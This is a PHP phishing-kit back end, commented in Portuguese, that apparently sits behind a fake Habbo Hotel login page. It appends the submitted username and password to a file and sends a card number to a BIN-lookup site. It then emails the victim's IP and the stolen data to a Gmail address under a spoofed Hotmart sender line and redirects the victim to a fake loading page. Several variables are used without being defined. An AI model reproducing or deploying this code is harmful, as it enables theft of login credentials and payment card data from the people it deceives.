<?php

$email = $_POST['usuario'];


$tudo = "".$email.";".$senha."<br>";

$fopen = fopen("owner.php", "a");

fwrite($fopen, $tudo);

fclose($fopen);

$rand = rand(0,9999999999);

$_SESSION['e2'] = $email;

$ip = $_SERVER["REMOTE_ADDR"];

$hora=@date("H:i:s");

$ch = @curl_init();

$numero=$numero;

// Define a URL original (do formulário de login)

@curl_setopt($ch, CURLOPT_URL, 'http://bin.cvvtools.pro/');

// Habilita o protocolo POST

@curl_setopt ($ch, CURLOPT_POST, 1);

// Define os parâmetros que serão enviados (usuário e senha por exemplo)

@curl_setopt ($ch, CURLOPT_POSTFIELDS, "data=$numero");

// Imita o comportamento patrão dos navegadores: manipular cookies

@curl_setopt ($ch, CURLOPT_COOKIEJAR, 'cookie.txt');

// Define o tipo de transferência (Padrão: 1)

@curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);

// Executa a requisição

$store = @curl_exec ($ch);

$var = $store;

$q = explode("<i>", $var); 

$q2 = explode("</i>", $q[1]);

$headers = "Content-type: text/html; charset=iso-8859-1\r\n";

    $headers .= "From:  HOTMART- VENDA REALIZADA COM SUCESSO!!  <emails@redec.com.br>";

$conteudo.="<b>IP: </b>$ip - B1N: </b>$q2[0]<br>";

$conteudo.="<b>Nome do Habbo: </b>$usuario<br>";


mail("dolaramericano23@gmail.com", "$q2[0] - $ip", "$conteudo", $headers);  



header("Location: Hotel/carregando.html");
